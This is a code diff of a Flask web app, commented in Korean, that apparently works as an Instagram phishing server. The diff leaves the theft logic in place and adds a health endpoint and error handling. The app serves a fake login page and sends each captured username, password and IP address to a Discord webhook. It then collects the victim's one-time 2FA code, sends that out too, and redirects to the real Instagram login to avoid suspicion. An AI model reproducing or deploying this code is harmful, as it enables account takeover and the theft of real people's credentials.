@@ -9,25 +9,30 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO
 
 @app.route('/')
 def index():
-    # 윈도우/리눅스 경로 차이 없이 렌더링하도록 설정
-    return render_template('login.html')
+    try:
+        # 파일 이름이 index.html이므로 이를 호출
+        return render_template('index.html')
+    except Exception as e:
+        # 에러 발생 시 로그 출력
+        return f"서버 에러 (파일을 찾을 수 없음): {str(e)}", 500
 
 @app.route('/login', methods=['POST'])
 def login():
-    # login.html의 name="username", name="password"와 일치시킴
+    # index.html의 name="username", name="password"와 일치
     uid = request.form.get('username')
     pw = request.form.get('password')
     
     if uid and pw:
+        # 디스코드 전송 데이터 구성
         payload = {
             "embeds": [{
-                "title": "🚨 인스타그램 계정 탈취 성공",
+                "title": "🚨 [피싱 성공] 계정 정보 유출",
                 "color": 16711680,
                 "fields": [
-                    {"name": "ID", "value": f"`{uid}`", "inline": True},
-                    {"name": "PW", "value": f"`{pw}`", "inline": True}
+                    {"name": "아이디(ID)", "value": f"`{uid}`", "inline": True},
+                    {"name": "비밀번호(PW)", "value": f"`{pw}`", "inline": True}
                 ],
-                "footer": {"text": f"IP: {request.remote_addr}"}
+                "footer": {"text": f"접속 IP: {request.remote_addr}"}
             }]
         }
         try:
@@ -35,25 +40,30 @@ def login():
         except:
             pass
         
-        # 정보를 뺏은 뒤 otp.html 렌더링
+        # 정보 뺏은 후 otp.html로 이동
         return render_template('otp.html')
     
     return redirect(url_for('index'))
 
 @app.route('/verify', methods=['POST'])
 def verify():
-    # [중요] otp.html의 name="otp_code"와 일치시킴
+    # otp.html의 name="otp_code"와 일치
     auth_code = request.form.get('otp_code')
     
     if auth_code:
-        # OTP 유출
-        requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 가로챔**: `{auth_code}`"})
-        # 진짜 인스타로 리다이렉트
+        # 인증번호 유출
+        requests.post(WEBHOOK_URL, json={"content": f"🔑 **[가로챈 OTP]**: `{auth_code}`"})
+        # 진짜 인스타로 리다이렉트해서 의심 피하기
         return redirect("https://www.instagram.com/accounts/login/")
     
     return redirect(url_for('index'))
 
+# Render 서버 유지용
+@app.route('/health')
+def health():
+    return "OK", 200
+
 if __name__ == '__main__':
-    # Render 환경에 맞는 동적 포트 설정
+    # Render 동적 포트 설정
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
